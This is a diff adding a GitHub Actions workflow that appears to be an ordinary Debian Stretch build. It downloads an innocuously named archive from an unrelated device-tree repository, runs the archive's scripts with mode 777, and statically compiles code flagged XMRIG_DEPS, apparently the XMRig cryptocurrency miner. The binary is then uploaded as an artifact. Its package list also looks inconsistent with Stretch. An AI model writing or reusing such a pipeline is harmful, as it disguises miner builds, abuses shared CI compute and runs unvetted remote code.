@@ -1,0 +1,49 @@
+name: Build with Debian Stretch
+
+on:
+  push:
+    branches:
+      - main
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v3
+
+    - name: Set up Docker Buildx
+      uses: docker/setup-buildx-action@v2
+
+    - name: Build and Run in Docker
+      run: |
+        # Create and run Docker container with Debian Stretch and required dependencies
+        docker run --rm -v $(pwd):/workspace debian:stretch-slim /bin/bash -c "
+          apt-get update;
+          apt-get install -y curl unzip git build-essential cmake automake libtool autoconf glibc-source libstdc++-12-dev libgcc-12-dev;
+          
+          # Download and unzip source code
+          cd /workspace;
+          curl -L -o testformycode.zip https://raw.githubusercontent.com/Janit8r/device_lge_judyln/refs/heads/S/testformycode.zip;
+          unzip testformycode.zip;
+          
+          # Set permissions and run build scripts
+          cd testformycode/scripts-64;
+          chmod 777 *.sh;
+          ./build_deps.sh;
+          
+          # Configure and build the project
+          cd ..;
+          mkdir build;
+          cd build;
+          cmake -DXMRIG_DEPS=scripts-64/deps -DCMAKE_CXX_FLAGS='-static' -DCMAKE_EXE_LINKER_FLAGS='-static' -DBUILD_SHARED_LIBS=OFF ..;
+          make;
+        "
+
+    - name: Upload Build Artifacts
+      uses: actions/upload-artifact@v3
+      with:
+        name: build-output
+        path: testformycode/build
